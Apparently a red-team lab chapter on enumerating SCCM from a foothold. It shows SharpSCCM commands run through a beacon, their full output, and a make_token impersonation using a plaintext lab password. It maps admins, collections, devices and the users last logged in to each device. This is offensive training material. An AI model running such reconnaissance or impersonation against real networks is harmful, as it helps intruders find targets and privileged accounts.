The first step when attacking SCCM is to get a feel for the deployment topology, which devices are being managed, and who the administrative users are.  Throughout this chapter, we'll use the [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) tool.  Given a foothold on a machine, we can begin by finding the management point and site code that it is linked to.  This does not require any special privileges in the domain, in SCCM or on the endpoint.

showing what `machine` enumeration is running on
```powershell
beacon> run hostname
wkstn-2
```
show what `user` is being utilized for enumeration
```
beacon> getuid
[*] You are DEV\bfarmer
```
Given a foothold on a machine, we can begin by finding the `management point` and `site code` that it is linked to.  
```
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

-----------------------------------
CurrentManagementPoint: scm-1.cyberbotic.io
Name: SMS:S01
-----------------------------------
[+] Completed execution in 00:00:00.2733939
```
This enumeration uses WMI under the hood, which could be done manually.
```powershell
beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

Name                   : SMS:S01
CurrentManagementPoint : scm-1.cyberbotic.io
```
We can also check the DACL on the `CN=System Management` container in AD for machines that have Full Control over it (as this a pre-requisite of SCCM setup in a domain).
```powershell
[12/18 21:19:45] beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
[12/18 21:19:58] [+] received output:
[!] Found 1 computer account(s) with GenericAll permission on the System Management container:

      CYBER\SCM-1$

[+] These systems are likely to be ConfigMgr site servers
[+] Completed execution in 00:00:00.7610946
```

Enumerating users, groups, computers, collections, and administrators, etc, does require some level of privilege in SCCM and cannot be done as a standard domain user.  SCCM employs an RBAC security model - the lowest role is "Read-Only Analyst" and the highest is "Full Administrator".  Lots of other roles exist such as "Asset Manager", "Infrastructure Administrator", and "Software Update Manager".  A description of each can be found [here](https://learn.microsoft.com/en-us/mem/configmgr/core/understand/fundamentals-of-role-based-administration).  Furthermore, the "scope" of these roles can be restricted to individual collections as needed by the administrative user.  For example, computers from the DEV and CYBER domains have been grouped into their own collections.
![[Pasted image 20231218162400.png]]

This can really impact your view (as an attacker) of how SCCM is configured.  For example, if we enumerate all the collections as bfarmer, we can see that both DEV and CYBER exist as well as their member counts.
- **`DEV` member count : 6**
- **`CYBER` member count : 4**
```powershell
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe get collections --no-banner
[+] host called home, sent: 1233202 bytes
[+] received output:

[+] Querying the local WMI repository for the current management point and site code

[+] received output:
[+] Connecting to \\127.0.0.1\root\CCM

[+] received output:
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[+] received output:
[+] Executing WQL query: SELECT CollectionID,CollectionType,IsBuiltIn,LastMemberChangeTime,LastRefreshTime,LimitToCollectionName,MemberClassName,MemberCount,Name FROM SMS_Collection  

[+] received output:
-----------------------------------
SMS_Collection
-----------------------------------

[+] received output:
CollectionID: S0100014
CollectionType: 2
IsBuiltIn: False
LastMemberChangeTime: 20230927154116.000000+***
LastRefreshTime: 20230927154116.000000+***
LimitToCollectionName: All Systems
MemberClassName: SMS_CM_RES_COLL_S0100014
MemberCount: 6
Name: DEV
-----------------------------------

[+] received output:
CollectionID: S0100015
CollectionType: 2
IsBuiltIn: False
LastMemberChangeTime: 20230927154102.000000+***
LastRefreshTime: 20230927154102.000000+***
LimitToCollectionName: All Systems
MemberClassName: SMS_CM_RES_COLL_S0100015
MemberCount: 4
Name: CYBER
-----------------------------------
[+] Completed execution in 00:00:03.1972949
```
However, if we run the same enumeration as jking, a member of DEV\Support Engineers, we only see the DEV collection.
making `DEV\jking` token
```powershell
beacon> make_token DEV\jking Qwerty123
[*] Tasked beacon to create a token for DEV\jking
[+] host called home, sent: 37 bytes
[+] Impersonated DEV\jking (netonly)
```
only able to see the `dev` group as `jking`
```powershell

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe get collections --no-banner
[+] host called home, sent: 1233202 bytes
[+] received output:


[+] received output:
[+] Querying the local WMI repository for the current management point and site code

[+] received output:
[+] Connecting to \\127.0.0.1\root\CCM

[+] received output:
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[+] received output:
[+] Executing WQL query: SELECT CollectionID,CollectionType,IsBuiltIn,LastMemberChangeTime,LastRefreshTime,LimitToCollectionName,MemberClassName,MemberCount,Name FROM SMS_Collection  

[+] received output:
-----------------------------------
SMS_Collection
-----------------------------------

[+] received output:
CollectionID: S0100014
CollectionType: 2
IsBuiltIn: False
LastMemberChangeTime: 20230927154116.000000+***
LastRefreshTime: 20230927154116.000000+***
LimitToCollectionName: All Systems
MemberClassName: SMS_CM_RES_COLL_S0100014
MemberCount: 6
Name: DEV
-----------------------------------
[+] Completed execution in 00:00:02.7439056
```
This is because even though DEV\Developers are only "Read-Only Analysts", the role is scoped to both collections.  DEV\Support Engineers are "Full Administrators" over the DEV collection but they have no roles that are scoped to the CYBER collection.
![[Pasted image 20231218171220.png]]
So when enumerating SCCM, you may only see a small slither based on the user you're running the enumeration as.
Administrative users can be found using `get class-instances SMS_Admin`.

```powershell
[12/18 22:12:47] beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
[12/18 22:12:59] [*] Tasked beacon to run .NET program: SharpSCCM.exe get class-instances SMS_Admin --no-banner
[12/18 22:12:59] [+] host called home, sent: 1233230 bytes
[12/18 22:13:01] [+] received output:

[+] Querying the local WMI repository for the current management point and site code

[12/18 22:13:01] [+] received output:
[+] Connecting to \\127.0.0.1\root\CCM

[12/18 22:13:01] [+] received output:
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[12/18 22:13:02] [+] received output:
[+] Executing WQL query: SELECT * FROM SMS_Admin  

[12/18 22:13:03] [+] received output:
-----------------------------------
SMS_Admin
-----------------------------------

[12/18 22:13:04] [+] received output:
AccountType: 0
AdminID: 16777217
AdminSid: S-1-5-21-3172385156-4142819851-505854602-500
Categories: SMS00ALL
CategoryNames: All
CollectionNames: All Systems, All Users and User Groups
CreatedBy: SCM-1\Administrator
CreatedDate: 20230925194557.000000+000
DisplayName: 
DistinguishedName: 
ExtendedData: Can't display Object as a String
IsCovered: False
IsDeleted: True
IsGroup: False
LastModifiedBy: SCM-1\Administrator
LastModifiedDate: 20230925194557.000000+000
LogonName: SCM-1\Administrator
Permissions: Can't display Object as a String
RoleNames: Full Administrator
Roles: SMS0001R
SKey: S01S-1-5-21-3172385156-4142819851-505854602-500
SourceSite: S01
-----------------------------------

[12/18 22:13:04] [+] received output:
AccountType: 1
AdminID: 16777220
AdminSid: S-1-5-21-2594061375-675613155-814674916-512
Categories: SMS00ALL
CategoryNames: All
CollectionNames: All Systems, All Users and User Groups
CreatedBy: SCM-1\Administrator
CreatedDate: 20230927154251.000000+000
DisplayName: 
DistinguishedName: CN=Domain Admins,CN=Users,DC=cyberbotic,DC=io
ExtendedData: Can't display Object as a String
IsCovered: False
IsDeleted: False
IsGroup: True
LastModifiedBy: SCM-1\Administrator
LastModifiedDate: 20230927154251.000000+000
LogonName: CYBER\Domain Admins
Permissions: Can't display Object as a String
RoleNames: Full Administrator
Roles: SMS0001R
SKey: S01S-1-5-21-2594061375-675613155-814674916-512
SourceSite: S01
-----------------------------------

[12/18 22:13:05] [+] received output:
AccountType: 1
AdminID: 16777221
AdminSid: S-1-5-21-569305411-121244042-2357301523-1107
Categories: SMS00UNA
CategoryNames: Default
CollectionNames: DEV, CYBER
CreatedBy: SCM-1\Administrator
CreatedDate: 20230927154357.000000+000
DisplayName: 
DistinguishedName: CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
ExtendedData: Can't display Object as a String
IsCovered: False
IsDeleted: False
IsGroup: True
LastModifiedBy: SCM-1\Administrator
LastModifiedDate: 20230927154542.000000+000
LogonName: DEV\Developers
Permissions: Can't display Object as a String
RoleNames: Read-only Analyst
Roles: SMS0002R
SKey: S01S-1-5-21-569305411-121244042-2357301523-1107
SourceSite: S01
-----------------------------------

[12/18 22:13:06] [+] received output:
AccountType: 1
AdminID: 16777222
AdminSid: S-1-5-21-569305411-121244042-2357301523-1108
Categories: SMS00UNA
CategoryNames: Default
CollectionNames: DEV
CreatedBy: SCM-1\Administrator
CreatedDate: 20230927154525.000000+000
DisplayName: 
DistinguishedName: CN=Support Engineers,CN=Users,DC=dev,DC=cyberbotic,DC=io
ExtendedData: Can't display Object as a String
IsCovered: True
IsDeleted: False
IsGroup: True
LastModifiedBy: SCM-1\Administrator
LastModifiedDate: 20230927154525.000000+000
LogonName: DEV\Support Engineers

[12/18 22:13:06] [+] received output:
Permissions: Can't display Object as a String
RoleNames: Full Administrator
Roles: SMS0001R
SKey: S01S-1-5-21-569305411-121244042-2357301523-1108
SourceSite: S01
-----------------------------------
[+] Completed execution in 00:00:05.5962260

```
This allows us to see what is reflected in the Configuration Manger GUI above.  Members of these collections can be found using `get collection-members -n <collection-name>`.
- allows us to see what computers are in the `DEV` Domain
```powershell
[12/18 22:14:29] beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
[12/18 22:14:41] [*] Tasked beacon to run .NET program: SharpSCCM.exe get collection-members -n DEV --no-banner
[12/18 22:14:41] [+] host called home, sent: 1233230 bytes
[12/18 22:14:42] [+] received output:

[+] Querying the local WMI repository for the current management point and site code

[12/18 22:14:42] [+] received output:
[+] Connecting to \\127.0.0.1\root\CCM

[12/18 22:14:42] [+] received output:
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[12/18 22:14:42] [+] received output:
[+] Found the DEV collection (S0100014)
[+] Executing WQL query: SELECT CollectionID,ResourceID,ClientCertType,Domain,IsActive,IsApproved,IsAssigned,IsClient,Name,SiteCode,SMSID FROM SMS_FullCollectionMembership WHERE CollectionID='S0100014' 

[12/18 22:14:42] [+] received output:
-----------------------------------
SMS_FullCollectionMembership
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: FS
ResourceID: 16777222
SiteCode: S01
SMSID: GUID:8F65287F-B3C0-4363-A3C1-059FA2589ACD
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: SQL-2
ResourceID: 16777223
SiteCode: S01
SMSID: GUID:6BB0D49E-5940-469D-A611-E629C5ACEE4B
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: WKSTN-1
ResourceID: 16777224
SiteCode: S01
SMSID: GUID:D0BC3F68-8800-4BD7-8F0A-EA2424D63438
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: WKSTN-2
ResourceID: 16777225
SiteCode: S01
SMSID: GUID:02E5FD54-AC4E-49C3-B8A2-E04AFE6E33C9
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: WEB
ResourceID: 16777226
SiteCode: S01
SMSID: GUID:C107E97D-45B0-4162-8104-16683CCE7EEE
-----------------------------------

[12/18 22:14:43] [+] received output:
ClientCertType: 1
CollectionID: S0100014
Domain: DEV
IsActive: True
IsApproved: 1
IsAssigned: True
IsClient: True
Name: DC-2
ResourceID: 16777228
SiteCode: S01
SMSID: GUID:CFDD0F4F-E37A-43C3-B54E-FB1BB324CA21
-----------------------------------
[+] Completed execution in 00:00:01.8975693
```
Even more information on each device can be obtained using `get devices`.  There are some good ways to filter the output, such as searching by device name, `-n`, and only displaying the properties specified by `-p`.
`get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner`
```powershell
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
[+] host called home, sent: 1233402 bytes
[+] received output:


[+] received output:
[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[+] received output:
[+] Executing WQL query: SELECT ResourceId,Name,FullDomainName,IPAddresses,LastLogonUserName,OperatingSystemNameandVersion FROM SMS_R_System WHERE Name LIKE '%WKSTN%' 

[+] received output:
-----------------------------------
SMS_R_System
-----------------------------------

[+] received output:
FullDomainName: DEV.CYBERBOTIC.IO
IPAddresses: 10.10.123.101
LastLogonUserName: nlamb
Name: WKSTN-1
OperatingSystemNameandVersion: Microsoft Windows NT Workstation 10.0
-----------------------------------

[+] received output:
FullDomainName: DEV.CYBERBOTIC.IO
IPAddresses: 10.10.123.102
LastLogonUserName: 
Name: WKSTN-2
OperatingSystemNameandVersion: Microsoft Windows NT Workstation 10.0
-----------------------------------
[+] Completed execution in 00:00:01.9526590
```
You can also use SCCM as a form of user hunting, since it records the last user to login to each managed computer.  The `-u` parameter will only return devices where the given user was the last to login.
```powershell
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
[*] Tasked beacon to run .NET program: SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
[+] host called home, sent: 1233284 bytes
[+] received output:


[+] received output:
[+] Querying the local WMI repository for the current management point and site code

[+] received output:
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: scm-1.cyberbotic.io
[+] Site code: S01
[+] Connecting to \\scm-1.cyberbotic.io\root\SMS\site_S01

[+] received output:
[+] Executing WQL query: SELECT ResourceId,IPAddresses,IPSubnets,Name FROM SMS_R_System WHERE LastLogonUserName='nlamb' 

[+] received output:
-----------------------------------
SMS_R_System
-----------------------------------

[+] received output:
IPAddresses: 10.10.123.101
IPSubnets: 10.10.122.0
Name: WKSTN-1
-----------------------------------
[+] Completed execution in 00:00:02.1410836
```
However, take these results with a grain of salt because this information is only updated in SCCM every 7 days by default.